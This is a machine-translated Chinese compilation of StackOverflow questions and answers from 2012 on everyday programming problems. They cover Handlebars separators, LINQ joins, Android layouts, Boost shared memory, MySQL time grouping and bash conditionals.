# StackOverflow 问答 10403000-10403999

# javascript - 除了最后一个元素之后，如何在 {{#each}} 循环中的元素之间添加分隔符？

> ID：10403003
> 
> 赞同：66
> 
> 时间：2012-05-01T19:20:17.347
> 
> 标签：javascript, ember.js, handlebars.js

我有一个 Handlebars 模板，我正在尝试从数组中生成以逗号分隔的项目列表。

在我的车把模板中：

```
{{#each list}}
    {{name}} {{status}},
{{/each}} 
```

我希望`,`不要出现在最后一项上。有没有办法在 Handlebars 中做到这一点，还是我需要回退到 CSS 选择器？

**更新**：根据克里斯托弗的建议，这就是我最终实施的：

```
var attachments = Ember.CollectionView.extend({
    content: [],
    itemViewClass: Ember.View.extend({
        templateName: 'attachments',
        tagName: 'span',
        isLastItem: function() {
            return this.getPath('parentView.content.lastObject') == this.get('content');
        }.property('parentView.content.lastObject').cacheable()
    })
})); 
```

在我看来：

```
{{collection attachments}} 
```

和项目视图：

```
{{content.title}} ({{content.size}}) {{#unless isLastItem}}, {{/unless}} 
```

* * *

## 回答 #1

> 赞同：154
> 
> 时间：2014-11-13T00:04:46.397

我知道我迟到了，但我找到了一个更简单的方法

```
{{#unless @last}},{{/unless}} 
```

* * *

## 回答 #2

> 赞同：60
> 
> 时间：2013-10-03T09:12:49.223

从 Ember v1.11 开始，您可以使用块参数获取每个索引的索引。在您的情况下，这看起来像这样：

```
{{#each list as |item index|}}
    {{if index ", "}}{{item.name}} {{item.status}}
{{/each}} 
```

第一个`index`值将被`0`评估为`false`不会被添加，所有后续值将评估为`true`将在分隔符前添加的值。

* * *

## 回答 #3

> 赞同：50
> 
> 时间：2012-05-01T22:32:19.123

您可以使用标准 CSS 来执行此操作：

```
li:after {
    content: ',';
}

li:last-of-type:after {
    content: '';
} 
```

我更喜欢单独的规则，但如果可读性稍差一些，则更简洁（来自评论中的@Jay）：

```
li:not(:last-of-type):after {
    content: ',';
} 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2014-06-25T12:49:52.753

我创建了 sep 块助手：

```
Handlebars.registerHelper("sep", function(options){
    if(options.data.last) {
        return options.inverse();
    } else {
        return options.fn();
    }
}); 
```

用法：

```
{{#each Data}}
   {{Text}}{{#sep}},{{/sep}}
{{/each}} 
```

支持 else 语句。

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2013-09-16T15:34:51.383

我意识到这是一岁了，但我遇到了类似的问题并在这里结束了。就我而言，我实际上是在处理一个数组。所以，这是我的解决方案。

```
Handlebars.registerHelper('csv', function(items, options) {
    return options.fn(items.join(', '));
});

// then your template would be
{{#csv list}}{{this}}{{/csv}} 
```

我想要一个简单而优雅的解决方案，将 csv 逻辑保留在模板中。

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2016-10-16T16:28:51.447

使用 ember 2.7，您可以在安装后执行此操作`ember-truth-helpers`：

```
ember install ember-truth-helpers 
```

然后您的模板将如下所示：

```
{{#each model as |e|}}
    {{e}}{{#unless (eq e model.lastObject)}}, {{/unless}}
{{/each}} 
```

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2014-06-23T15:02:12.117

我得到了这个与freak3dot答案的修改版本一起工作：

```
handlebars.registerHelper('csv', function(items, options) {
  return items.map(function(item) {
    return options.fn(item)
  }).join(', ')
}) 
```

（这是一个节点应用程序，因此`map`如果您在浏览器中构建，请相应地将其更改为下划线或其他）

允许在每个逗号之间格式化对象：

```
{{#csv players}
  {{firstName}} {{lastName}}
{{/csv}} 
```

编辑：这是一个更灵活的版本。加入任意分隔符上的事物列表。

```
handlebars.registerHelper('join', function(items, separator, options) {
  return items.map(function(item) {
    return options.fn(item)
  }).join(separator)
}) 
```

和模板：

```
{{#join players ' vs '}
  {{firstName}} {{lastName}}
{{/join}} 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2012-05-01T19:50:19.123

也许对于这种情况，您应该为集合创建一个视图，而不是成员项上的视图迭代。在这种情况下，Handlebar 迭代器是多余的。在下面的示例中，对 Person 对象的 firstName 或 lastName 的更改将绑定到列表并更新视图。

模板：

```
{{App.listController.csv}} 
```

Javascript：

```
App = Ember.Application.create();

var Person = Ember.Object.extend({
    firstName: null,
    lastName: null
});

var bob = Person.create({
    firstName: "bob",
    lastName: "smith"
});

var ann = Person.create({
    firstName: "ann",
    lastName: "doe"
});

App.listController = Ember.Object.create({
    list: [bob, ann],
    csv: Ember.computed(function () {
        var arr = [];
        this.get('list').forEach(function (item, index, self) {
            arr.push(item.firstName + ' ' + item.lastName);
        })
        return arr.join(',');
        }).property('list.@each.firstName', 'list.@each.lastName')
});
// any changes to bob or ann will update the view
bob.set('firstName', 'tim');
// adding or removing from the array will update the view
App.listController.get('list').pushObject(Person.create(firstName: "Jack", lastName:"Dunn"}); 
```

以下是我的原始答案，不适用于这种情况。

您应该可以使用助手执行此操作：

```
Handlebars.registerHelper('csv', function(items, options) {
  var out = "";
  for(var i=0, l=items.length; i<l; i++) {
    out += options.fn(items[i]);
    if (i < l - 1) {
        out += ',';
    }
    // might want to add a newline char or something
  } 
  return out;
});

// then your template would be
{{#csv list}} {{name}} {{status}} {{/each}} 
```

# c# - 左外连接 2 个数据表

> ID：10403006
> 
> 赞同：0
> 
> 时间：2012-05-01T19:20:24.853
> 
> 标签：c#, linq

我试图了解如何查询，最好使用 LINQ，2 个数据表。我想对它们进行 LEFT OUTER JOIN

带有 col 的 Datatable1：[ID] [colA]
带有 col 的 DataTable2：[ID] [ColB] [ColC] ...

希望加入该ID。

有人可以给我看一个例子，以便我可以将它应用到我拥有的数据表中吗？先感谢您

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:52:18.907

这将根据给定的结果集编译并执行您期望的操作：

```
// create the default row to be used when no value found
var defaultRow = DataTable2.NewRow();
defaultRow[0] = 0;
defaultRow[1] = String.Empty;

// the query
var result = from x in DataTable1.AsEnumerable()
    join y in DataTable2.AsEnumerable() on (string)x["ID"] equals (string)y["ID"] 
             into DataGroup
    from row in DataGroup.DefaultIfEmpty<DataRow>(defaultRow)
    select new {a = x["ColA"], b = (string)row["ColB"]}; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-01T19:44:18.060

得到一个`LEFT OUTER Join`

*你应该尝试使用@Joanna 链接。*

```
from x in DataTable1
join y in DataTable2 on x.ID equals y.ID into DataGroup
from item in DataGroup.DefaultIfEmpty(new y.ColB = String.Empty , y.ColC = String.Empty})
select new {x.ColA, item.ColB , item.ColC} 
```

**更新**

鉴于您提供的内容，您应该查找 LINQ-Dataset 文章

这是代码片段

```
DataTable DataTable1 = new DataTable();
DataTable DataTable2 = new DataTable();

DataTable1.Columns.Add("ID");
DataTable1.Columns.Add("ColA");
DataTable1.Rows.Add(1, "A");
DataTable1.Rows.Add(2, "B");    

DataTable2.Columns.Add("ID");
DataTable2.Columns.Add("ColB");
DataTable2.Rows.Add(1, "B");

var result = from x in DataTable1.AsEnumerable()
             join y in DataTable2.AsEnumerable() on x["ID"] equals y["ID"] into DataGroup                         
             from item in DataGroup.DefaultIfEmpty()
             select new {
                            ID = x["ID"],
                            ColA = x["ColA"],
                            ColB = item == null ? string.Empty : item["ColB"]
                        };
foreach (var s in result)
    Console.WriteLine("{0}", s); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-05-01T19:27:56.917

要获得内部连接，试试这个

```
from x in Datatable1
join y in Datatable2 on x.ID equals y.ID
select new {x.colA, y.ColB, y.ColC } 
```

# ios - 如何在 iOS 上触发将恢复我的广播流的闹钟？（如 tuneIn 电台）

> ID：10403013
> 
> 赞同：3
> 
> 时间：2012-05-01T19:20:51.107
> 
> 标签：ios, radio, uilocalnotification, alarm

我想知道如何在 iOS 上编写一个闹钟来恢复我的广播流。TuneIn Radio 应用程序中的警报实现就是这种行为的一个示例。

我尝试使用 UILocalNotification 并在 didReceiveLocalNotification 消息中恢复播放，但这仅在我们从通知中解除警报时才会调用。我想在没有警报的情况下调用它。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-10T22:25:33.043

你不能这样做，你需要一个合法的解决方法。我最近为一个需要在没有流式无线电位的情况下实现相同功能的应用程序解决了这个问题。您将在用户设置闹钟的那一刻将您的应用程序置于后台。这将通过播放无声音轨循环整夜，您将进行一些日期数学运算并配置您的无线电流以在最终（计算的）无声音轨触发后开始播放。您可以使用 audioidifinishplaying 在夜间收听每个静音循环的结束。希望这可以帮助。

另一个快速说明：我会参考文档来设置您的应用程序，特别是您的 plist 以使其正确配置为背景音频。

# android - onResume() 后纵横比错误

> ID：10403016
> 
> 赞同：0
> 
> 时间：2012-05-01T19:21:03.630
> 
> 标签：android, surfaceview, aspect-ratio

我有问题。调用 onResume 后，我的媒体播放器的纵横比变得混乱

```
private void aspectRatio(MediaPlayer vp)
{

    Integer videoHeight;
    Integer videoWidth;
    //Obtain current video's dimensions for keeping aspect Ration the same on all devices
    videoHeight = vp.getVideoHeight();
    videoWidth = vp.getVideoWidth();

    //Get width of screen
    Integer screenWidth = getWindowManager().getDefaultDisplay().getWidth();
    Integer screenHeight = getWindowManager().getDefaultDisplay().getHeight();

    Log.i("AspectRatio VP WxH", videoHeight.toString() +" x " + videoWidth.toString());
    Log.i("AspectRatio Screen WxH", screenHeight.toString() + " x " + screenWidth.toString());
    ViewGroup.LayoutParams viewParameters = view.getLayoutParams();

    float ratioWidth = (float)screenWidth/(float)videoWidth;
    float ratioHeight = (float)screenHeight/(float)videoHeight;
    float aspectRatio = (float)videoWidth/(float)videoHeight;

    if(ratioWidth>ratioHeight)
    {
        viewParameters.width = (int)(screenHeight * aspectRatio);
        viewParameters.height= screenHeight;
    }
    else if(ratioWidth < ratioHeight)
    {
        viewParameters.width = screenWidth;
        viewParameters.height = (int) (screenHeight / aspectRatio);
    }

    Integer x = viewParameters.width;
    Integer y = viewParameters.height;
    Log.i("Screen", x.toString() + " " + y.toString());
    view.setLayoutParams(viewParameters);
} 
```

那是获取纵横比并将其放入我的surfaceView的函数。问题是在 onResume() 之后它的宽度比它应该的要小得多。你能看出什么问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T16:37:05.703

纵横比搞砸了，因为当表面改变时，它又被创建了。现在我对其进行了更改，以便在 onSurfaceChanged 中也设置纵横比。它目前可以正常工作。

# android - 如何隐藏图形布局中的元素？

> ID：10403020
> 
> 赞同：13
> 
> 时间：2012-05-01T19:21:28.750
> 
> 标签：android, eclipse, android-layout

我的视图中有项目，这些项目在点击时显示，但在活动开始时不显示。现在一切正常，但是当我使用图形布局工具时，我看到了这些项目，这使得使用它变得更加困难。

意思是，我有一个带有项目的 ListView，我看到这些项目位于所有内容之上。

我怎样才能隐藏这些元素？以编程方式设置可见性没有帮助。我应该做一些事情，比如将 alpha 设置为 0，然后添加它而不是让项目不可见吗？似乎是一个愚蠢的想法，我必须有一些选择。

帮助任何人？

谢谢，埃里克

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2012-05-01T19:30:08.443

为什么不将可见性设置为 'gone': `android:visibility="gone"`？这将防止布局项目出现*并*占用布局中的空间。

或者，如果视图层次结构中的某些元素可能根本不会向用户显示，则可以使用[`ViewStub`](http://developer.android.com/reference/android/view/ViewStub.html)s 在运行时“延迟”加载它们。A`ViewStub`只是其他视图（层次结构）的占位符，它本身是空的且大小为零。这是将视图层次结构分离为默认和可选元素的好方法，并且可以在运行时显着降低视图层次结构的复杂性。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2013-07-15T15:11:07.193

如果您想以编程方式/有条件地隐藏元素，而不是像上面建议的那样在布局 XML 中隐藏元素并且设置可见性不起作用，也许您的语法错误？这是您以编程方式隐藏元素的方式：

```
element.setVisibility(View.GONE); 
```

# c++ - 非 Null-Terminated 字符串，同时使用 boost 进程间共享字符串数据，(v 1.41, 1.44) x86_64

> ID：10403022
> 
> 赞同：0
> 
> 时间：2012-05-01T19:21:34.953
> 
> 标签：c++, linux, gcc, boost, boost-interprocess

我花了一些时间搜索 boost 进程间文档，但我仍然被这个奇怪的错误所困扰。我已经看到此代码适用于 boost 版本 1.42、x86，但不适用于标题中提到的版本。

这是一个共享字符串的简单客户端-服务器模型。服务器设置并等待。当客户端与服务器共享新字符串时，它会打印新共享的字符串。代码如下：

服务器：

```
//compile this with: g++ -g server.cc -o server -lrt -lboost_thread-mt -lpthread -lcurses
#include <boost/interprocess/containers/string.hpp>
#include <boost/interprocess/containers/map.hpp>
#include <boost/interprocess/allocators/allocator.hpp>
#include <boost/interprocess/managed_shared_memory.hpp>
#include <cassert>
#include <boost/interprocess/containers/vector.hpp>
#include <iostream>
#include<curses.h>
#include<unistd.h>

using namespace std;
using namespace boost::interprocess;

int main()
{

typedef boost::interprocess::allocator<char, managed_shared_memory::segment_manager> CharAllocator;
typedef boost::interprocess::basic_string<char, std::char_traits<char>, CharAllocator> opString;
typedef boost::interprocess::allocator<opString, managed_shared_memory::segment_manager> StrAlloc;
typedef vector<opString, StrAlloc> opStringVector;

struct shm_remove
{
      shm_remove() { shared_memory_object::remove("opSHM"); }
      ~shm_remove(){ shared_memory_object::remove("opSHM"); }
} remover;

managed_shared_memory managed_shm(open_or_create, "opSHM", 1000);

CharAllocator     charallocator  (managed_shm.get_segment_manager());
    StrAlloc   stralloc(managed_shm.get_segment_manager());

opStringVector * ID_Descript = managed_shm.construct<opStringVector>("ID_DESCRIPTOR")(stralloc);
opStringVector * ID_Handle = managed_shm.construct<opStringVector>("ID_HANDLE")(stralloc);

std::string serD = "This is the server";
std::string serI = "SERVER";

opString st1(charallocator);
opString st2(charallocator);
st1 = serD.c_str();
st2 = serI.c_str();

ID_Descript->push_back(st1);
ID_Handle->push_back(st2);

int i=0;

initscr();     //in ncurses
timeout(0);

int lastSize = 0;//ID_Handle2->size();
printw("\n Registration List: \n");
while(!i)
{
    usleep(10000);
    i=getch();
if(ID_Handle->size()!=lastSize)
{   
    for(int j = lastSize;j<ID_Handle->size();j++)
    {   
        const char * hand_st = ID_Handle->at(j).c_str();
        const char * desc_st = ID_Descript->at(j).c_str();
        std::string hID = hand_st;
        std::string dID = desc_st;
        std::string newstr = "New process registered: " + hID + "\t" + dID;
        const char * st = newstr.c_str();
            printw("%s \n",st);
    }
    lastSize = ID_Handle->size();
}
    if(i>0)
        i=1;
    else
        i=0;

}
endwin();   

} 
```

客户：

```
//Compile this with: g++ -g client.cc -o client -lrt -lboost_thread-mt -lpthread -lcurses

#include <boost/interprocess/containers/string.hpp>
#include <boost/interprocess/containers/map.hpp>
#include <boost/interprocess/allocators/allocator.hpp>
#include <boost/interprocess/managed_shared_memory.hpp>
#include <cassert>
#include <boost/interprocess/containers/vector.hpp>
#include <iostream>
#include<curses.h>
#include<unistd.h>

using namespace std;
using namespace boost::interprocess;

int main()
{

    typedef boost::interprocess::allocator<char, managed_shared_memory::segment_manager> CharAllocator;
    typedef boost::interprocess::basic_string<char, std::char_traits<char>, CharAllocator> opString;
    typedef boost::interprocess::allocator<opString, managed_shared_memory::segment_manager> StrAlloc;
    typedef vector<opString, StrAlloc> opStringVector;

    managed_shared_memory managed_shm(open_only, "opSHM");
    CharAllocator     charallocator  (managed_shm.get_segment_manager());
        StrAlloc   stralloc(managed_shm.get_segment_manager());

    opStringVector * ID_Descript2 = managed_shm.find<opStringVector>("ID_DESCRIPTOR").first;
    opStringVector * ID_Handle2 = managed_shm.find<opStringVector>("ID_HANDLE").first;

    opString st1(charallocator);
    opString st2(charallocator);

    std::string des; 
    std::string handle;

    des = "A Dummy registration";
    handle = "DU";
    st1 = des.c_str();
    st2 = handle.c_str();
    ID_Descript2->push_back(st1);
    ID_Handle2->push_back(st2);
    cout << ID_Descript2->back() << '\t' << ID_Handle2->back()  << endl;

    des = "Null Algorithm\0";
    handle = "OP_NULL";
    st1 = des.c_str();
    st2 = handle.c_str();
    ID_Descript2->push_back(st1);
    ID_Handle2->push_back(st2);
    cout << ID_Descript2->back() << '\t' << ID_Handle2->back()  << endl;

    des = "First Algorithm";
    handle = "OP_ALG_FIRST";
    st1 = des.c_str();
    st2 = handle.c_str();
    ID_Descript2->push_back(st1);
    ID_Handle2->push_back(st2);
    cout << ID_Descript2->back() << '\t' << ID_Handle2->back()  << endl;

    des = "Last Algorithm";
    handle = "OP_ALG_LAST";
    st1 = des.c_str();
    st2 = handle.c_str();
    ID_Descript2->push_back(st1);
    ID_Handle2->push_back(st2);
    cout << ID_Descript2->back() << '\t' << ID_Handle2->back()  << endl;

} 
```

这是服务器输出：

```
Registration List:
New process registered: SERVER  This is the server
New process registered: DU  A Dummy registration
New process registered: OP_NULL Null AlgorithmTver
New process registered: OP_ALG_FIRST    First AlgorithmAtion
New process registered: OP_ALG_LAST     Last Algorithm 
```

这是客户端输出：

```
A Dummy registration    DU
Null Algorithm  OP_NULL
First Algorithm OP_ALG_FIRST
Last Algorithm  OP_ALG_LAST 
```

如您所见，服务器获取的是字符串数据，但由于不正确的字符串终止，会在其输出中打印额外/重叠的字符（第 4 行和第 5 行）。客户端数据未损坏。我想知道是否还有其他重要的事情没有完成。希望对此有任何指示。它在 Boost 1.42 x86 版本上的工作方式也很奇怪，而服务器端没有任何损坏。非常感谢！

PS：当我使用托管共享内存功能时，我没有明确使用任何同步（互斥）机制。我一定要吗？

# postgresql - 当提示输入 ec2-user 密码时该怎么办？

> ID：10403025
> 
> 赞同：4
> 
> 时间：2012-05-01T19:21:40.757
> 
> 标签：postgresql, amazon-ec2

我正在尝试运行

```
sudo -u postgres psql -d template1 -U postgres -p 
```

在“Amazon Linux AMI 2012.03”ec2 实例上。但随后我收到提示输入 ec2-user 密码：

```
[sudo] password for ec2-user: 
```

但我使用密钥对登录？有一个简单的解决方法吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T19:48:07.297

他们的服务器不保存密码，因为它没有在 .pgpass 文件中设置，或者权限是打开的，因此文件被忽略。

检查 Unix/Linux 系统上的权限。在 *nix 系统上，对 .pgpass 的权限必须禁止对世界或组的任何访问；通过命令 chmod 0600 ~/.pgpass 实现这一点。如果权限不那么严格，则该文件将被忽略。

在此处阅读有关[密码文件的](http://www.postgresql.org/docs/9.1/static/libpq-pgpass.html "PostgresSQL 文档：31.14。 密码文件")更多信息。

您是否尝试过使用 PGAdmin 登录？您可以在那里保存密码，并修改 pgpass 文件。

# javascript - jQuery Datatable 表超出模板

> ID：10403027
> 
> 赞同：1
> 
> 时间：2012-05-01T19:21:51.797
> 
> 标签：javascript, jquery, html, css, datatable

我正在使用 Datatables.net，我遇到了一个问题，他们的表似乎超出了其中包含的块的约束。作用类似于浮动元素。我不确定如何解决这个问题，因为我不确定到底发生了什么。

更多次然后更少我的表格将留在我的模板范围内，并在需要的地方推送模板，除了这个表格。我的意思的例子

![在此处输入图像描述](../Images/b382c5db8d789935e6ee70b1570b9659.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T19:43:45.303

您可以使用 CSS 属性“溢出”来控制包含元素是否显示过大的数据表。如果你设置了overflow:hidden，表格将被截断，而如果你设置overflow:scroll，包含的元素会得到一个滚动条，你可以用它来查看整个表格（通过滚动它）。

但是，我猜您想防止溢出，在这种情况下，您的问题归结为数据表的宽度及其容器的宽度。如果您的数据表的内容太大，那么您需要使用数据表选项来调整内容（例如，您可能希望将您的 aoColumnDefs 更改为具有更短的标题文本）。如果表格的内容是您想要的，但您想让表格更小，那么您需要使用 CSS 来处理它（即，您可能想要降低字体大小）。

最后，如果数据表大小合适，而您的问题只是包含元素太小，则需要增加该包含元素的宽度（通过 CSS 属性 width 或 min-width）。

希望有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T19:40:11.477

没有特定的代码很难。您是否尝试过通常的 clearfix 选项？

在第二个答案中有很好的例子说明如何做到这一点，在这里： [我可以使用哪些“clearfix”方法？](https://stackoverflow.com/questions/211383/which-method-of-clearfix-is-best)

# c# - FOV 测试正在检测前面和后面的玩家

> ID：10403036
> 
> 赞同：0
> 
> 时间：2012-05-01T19:22:37.163
> 
> 标签：c#, xna, angle, pi, fieldofview

我在这里遇到了一个奇怪的问题。我已经为我的敌人实施了一个视野，这样当玩家进入可检测区域（前方 120 度圆锥）时，他会被坏人追赶，直到他离开 FOV。

问题是敌人后面也有一个 120 FOV 的锥体，所以有两个锥体，一个在前面，一个在后面，我只想使用前面的那个。我唯一能想到的是我正在溢出通过的 PI？我真的不确定。

我使用本教程使用矢量数学来实现这一点。点积部分。 [http://blog.wolfire.com/2009/07/linear-algebra-for-game-developers-part-2/](http://blog.wolfire.com/2009/07/linear-algebra-for-game-developers-part-2/)

这是与FOV相关的代码。

```
 Vector2 EnemyVecAngle = new Vector2((float)Math.Cos(EnemyAnimation.Angle), (float)Math.Sin(EnemyAnimation.Angle));

        //normalize
        Vector2 EnemyFacingN = Vector2.Normalize(EnemyVecAngle);
        Vector2 EnemytoPlayer = Vector2.Normalize(player.Position - Position);

        //check angle
        float CheckAngle = (float)Math.Acos(Vector2.Dot(EnemyFacingN, EnemytoPlayer));

if ((CheckAngle >= 60) && (CheckAngle <= 120)
following = true; 
```

这是一旦检测到敌人就会面向玩家的语句

```
EnemyAnimation.Angle = (float)Math.PI / -2 + (float)Math.Atan2(Position.Y - player.Position.Y, Position.X - player.Position.X); 
```

我想知道为什么我需要添加 -PI/2 才能使其工作，我认为这可能与问题有关。任何帮助是极大的赞赏！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-02T21:46:16.700

我认为添加 Math.PI / -2 是将纹理旋转 90º。

你应该使用 Atan2：

```
 Vector2 EnemyVecAngle = new Vector2((float)Math.Cos(EnemyAnimation.Angle), (float)Math.Sin(EnemyAnimation.Angle));

    //normalize
    Vector2 EnemyFacingN = Vector2.Normalize(EnemyVecAngle);
    Vector2 EnemytoPlayer = Vector2.Normalize(player.Position - Position);

    //check angle
    float CheckAngle = (float) (Math.Atan2(EnemyFacingN.Y, EnemyFacingN.X) 
                              - Math.Atan2(EnemytoPlayer.Y, EnemytoPlayer.X) ); 
```

这样就足够了... Atant2 将处理直角符号...尽管您将检查新计算的角度以选择合适的范围...

# c# - 使用 Windows Phone 7 解析包含数组的 JSON 对象

> ID：10403037
> 
> 赞同：3
> 
> 时间：2012-05-01T19:22:39.013
> 
> 标签：c#, json, windows-phone-7

好的，我对此有些困难。

我的 JSON 就像

```
{ "names" : [ {"name":"bla"} , {"name":"bla2"} ] } 
```

我试图做[这个教程](http://msdn.microsoft.com/en-us/windowsmobile/Video/hh237494)，但是由于 JSON 不同，它没有用。

我必须在这个方法里面放什么？我不知道是创建一个包含我的列表的“包装”类还是直接使用 JsonObject 更好。你能给我一个片段吗？我是 C# 的新手。

```
void webClient_OpenReadCompleted(object sender, OpenReadCompletedEventArgs e)
    {
        DataContractJsonSerializer ser = null;
        try
        {
           ???
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    } 
```

提前致谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-01T19:33:53.023

使用[Json.Net](http://json.codeplex.com/)（支持 Windows Phone）

```
string json = @"{ ""names"" : [ {""name"":""bla""} , {""name"":""bla2""} ] }";

var dict = (JObject)JsonConvert.DeserializeObject(json);
foreach (var obj in dict["names"])
{
    Console.WriteLine(obj["name"]);
} 
```

或者，如果您想以类型安全的方式使用它

```
var dict = JsonConvert.DeserializeObject<RootClass>(json);
foreach (var obj in dict.names)
{
    Console.WriteLine(obj.name);
}

public class RootClass
{
    public MyName[] names { get; set; }
}

public class MyName
{
    public string name { get; set; }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T19:43:00.820

使用 .NET DataContractJsonSerializer，您需要定义一个映射 json 对象的类。像这样的东西（如果我没记错的话）：

```
/// <summary>
/// 
/// </summary>
[DataContract]
public class Result
{
    /// <summary>
    /// 
    /// </summary>
    [DataMember(Name = "name")]
    public string Name
    { get; set; }
}

 /// <summary>
/// 
/// </summary>
[DataContract]
public class Results
{
    /// <summary>
    /// 
    /// </summary>
    [DataMember(Name = "names")]
    public List<Result> Names
    { get; set; }
} 
```

然后在您的事件处理程序中：

```
DataContractJsonSerializer serializer = new DataContractJsonSerializer(typeof(Results));
var results = (Results)serializer.ReadObject(SOME OBJECT HOLDING JSON, USUALLY A STREAM); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-01T19:29:40.267

我通常使用 JSON.NET ( [http://james.newtonking.com/projects/json-net.aspx](http://james.newtonking.com/projects/json-net.aspx) )，所以我的代码可能会有所不同。

对于列表内容，我会选择一个具有这样 name 属性的类：

```
public class NameClass {
    public string name { get;set; }
} 
```

然后您应该能够使用 JSON.NET a 反序列化`List<NameClass>`：

```
List<NameClass> result = JsonConvert.Deserialize<List<NameClass>>(jsonString); 
```

这是我脑子里写的，所以也许它不能通过复制和粘贴来编译，但它应该可以作为示例使用。

# mysql - MySQL：选择查询，5 分钟增量

> ID：10403039
> 
> 赞同：4
> 
> 时间：2012-05-01T19:22:42.307
> 
> 标签：mysql, sql, pchart

我有一个天气数据库，它大约每 70 秒获取一次数据集（取决于气象站何时提供数据）。
我想使用 Pchart 绘制它，但我有太多样本，所以 X 轴被搞砸了。
所以我想要大约每 5 分钟的数据。（或每 30 分钟一次）
我目前的查询是这样的：

```
SELECT time, temp_out FROM wmr200 WHERE date(time) = curdate() 
```

这将获取过去 24 小时的样本，但样本太多。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-01T19:29:46.220

以下将为您提供一个包含时间戳为 :00, :05, :10 ... 的任何数据的示例

```
SELECT time, temp_out FROM wmr200 WHERE date(time) = curdate()
    AND mod(minute(time),5) = 0 
```

我正在使用模函数来检查时间的分钟部分是否（0 或）可被 5 整除。

* * *

如果每个时间段只需要一个结果，我们就必须变得相当复杂。

```
SELECT concat(date(time),' ',hour(time),':',round(minute(time)/5,0)*5), 
       min(temp_out), avg(temp_out), max(temp_out) 
FROM wmr200 
GROUP BY date(time), hour(time), round(minute(time)/5,0)*5 
```

我现在无法访问 MySQL 实例来对其进行测试，但这是我的想法。它按每五分钟分组，按日期、小时和`round(minute(time)/5,0)*5`- 分组，将分钟四舍五入到最接近的 5。

它选择应该分组的时间值，以及 min、avg 和 max temp_out，因为我不确定其中哪一个最适合您的情况。

但是，如果您的数据库在 5 分钟内没有数据（或 30 分钟，如果您正在使用），它可能仍然没有样本点的数据。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-11-06T23:59:36.307

万一其他人出现在此页面上，这里有一个与 Sam 相当的解决方案。它利用 Unix 时间戳和整数除法来“分箱”和任意时间段内的平均值。

```
SELECT FROM_UNIXTIME((UNIX_TIMESTAMP(time) div (5*60))*(5*60)+(5*60)) as timeIntervals,
round(avg(temp_out),3) as temp_out
FROM wmr200 
GROUP BY 1 
```

# java - 有没有办法从 Java Play 2 框架中的数据库生成代码？

> ID：10403042
> 
> 赞同：4
> 
> 时间：2012-05-01T19:23:03.067
> 
> 标签：java, playframework, playframework-2.0

有谁知道如何在 Play Framework 2.0 中轻松地从数据库生成代码？

我知道他们有一个模块，但似乎这是针对 1.X 版的。

任何人？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-02T08:48:18.450

CRUD 模块仅适用于 Play 1.2.x，在 Play 2.0 中不可用。它可能在 Play 2.1 中可用，但我不确定这是否仍在路线图上。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-02T13:50:01.393

你的问题有两个方面：

1.  基于数据库创建所有模型。在那里你可以从 jpa-generator 开始玩 1.x，因为 ebean 也使用 JPA。它应该几乎是您所需要的。另一种方法是从数据库中的 ebean-models 进行逆向工程。但我担心这行不通。在[minuteproject](http://minuteproject.wikispaces.com/)我找不到任何例子。Ebean 和 JPA-Model 非常相似。

2.  从名为脚手架或 crud 的 DB-Model 创建 GUI。有些人正在研究它，并[在 play 2.0 中发现了一些错误](https://play.lighthouseapp.com/projects/82401/tickets/376-cannot-route-to-inherited-methods-in-java-controllers)。所以我担心你需要几个月的时间才能得到像 CRUD 这样的东西。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-03T14:35:26.300

简短的回答是不，这是模块尚未开发在玩！2.0 但我最喜欢从 java 对象到 DB 在玩这很容易。ebeans 确实简化了 ORM 工作。 [https://github.com/playframework/Play20/wiki/JavaDatabase](https://github.com/playframework/Play20/wiki/JavaDatabase)

# arrays - Shell 脚本条件语句 if else 不起作用

> ID：10403047
> 
> 赞同：0
> 
> 时间：2012-05-01T19:23:27.963
> 
> 标签：arrays, macos, shell, if-statement

说到壳牌，我是菜鸟

这个块应该工作，但它没有

```
 #!/bin/bash 
     # LOCAL CONFIGURATION SETTINGS - DB_CONFIG is a "fake" associative array
     #----------------------------------------------------------------------------------
     DB_CONFIG=(
        "DB_NAME=>"
        "DB_USER=>root"
        "DB_PASSWORD=>root"
        "DB_HOST=>127.0.0.1"
        "DB_CHARSET=>utf8"
        "DB_COLLATE=>"
     );

     for prop in ${DB_CONFIG[@]} ; do
     key=${prop%%=>*}
     value=${prop##*=>}
     echo $key;
     if[["$key" == "DB_HOST"]] then 
           db_host="$value"

     if[["$key" == "DB_PASSWORD"]] then  
           db_password="$value"

     done;

     # now set the mysql_conn string with the vars above.
     MYSQL_CON="/Applications/MAMP/Library/bin/mysql --host=$db_host -uroot -$db_password"
     exit;
     REPO='http://svn.wp-plugins.org/' 
```

`$key == 'DB_HOST'`问题是如果我无法弄清楚表达式的语法，如何检查条件。我已经研究了如何做到这一点，但是在我的 mac（运行 bash 3.2）上，如果抱怨语法错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T19:33:14.217

在此之前，您需要为`[`and`]`和 a留出空间`;`

```
if [ "$key" == "DB_HOST" ]; then 
      db_host="$value"
